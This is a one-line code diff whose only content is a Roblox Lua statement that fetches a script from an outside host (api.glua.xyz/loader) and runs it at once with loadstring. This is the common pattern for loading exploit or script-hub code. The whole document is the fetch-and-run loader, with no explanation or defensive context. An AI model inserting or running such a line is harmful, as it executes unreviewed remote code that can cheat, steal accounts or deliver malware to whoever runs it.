@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.glua.xyz/loader"))()
